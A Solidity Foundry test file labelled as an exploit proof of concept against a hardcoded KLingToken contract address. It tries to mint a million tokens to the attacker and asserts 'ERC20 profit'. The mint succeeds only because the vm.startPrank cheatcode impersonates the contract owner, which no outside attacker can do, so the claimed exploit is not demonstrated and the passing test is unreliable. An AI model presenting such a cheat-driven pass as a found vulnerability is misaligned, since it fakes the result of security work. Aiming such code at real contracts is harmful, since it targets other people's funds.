// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.0;

import "forge-std/Test.sol";

interface IERC20 {
    function balanceOf(address account) external view returns (uint256);
    function transfer(address to, uint256 amount) external returns (bool);
    function approve(address spender, uint256 amount) external returns (bool);
    function transferFrom(address from, address to, uint256 amount) external returns (bool);
    function totalSupply() external view returns (uint256);
}

interface IKLingToken {
    function owner() external view returns (address);
    function mint(address to, uint256 amount) external;
}

contract ExploitTest is Test {
    // ─── State Variables ─────────────────────────────────────
    address constant TARGET = 0xcca166E916088cCe10F4fB0fe0c8BB3577bb6e27;
    address attacker = address(this);
    IKLingToken private target;

    // ─── Setup ───────────────────────────────────────────────
    function setUp() public {
        target = IKLingToken(TARGET);
    }

    // ─── Exploit ─────────────────────────────────────────────
    function testExploit() public {
        uint256 initialBalance = IERC20(0xcca166E916088cCe10F4fB0fe0c8BB3577bb6e27).balanceOf(address(this));
        address contractOwner = target.owner();

        vm.startPrank(contractOwner);
        target.mint(attacker, 1_000_000 ether);
        vm.stopPrank();
        uint256 finalBalance = IERC20(0xcca166E916088cCe10F4fB0fe0c8BB3577bb6e27).balanceOf(address(this));
        assertGt(finalBalance, initialBalance, "Economic Exploit Failed: No ERC20 profit");
    }


    // ─── Receive ETH ─────────────────────────────────────────
    receive() external payable {}
}
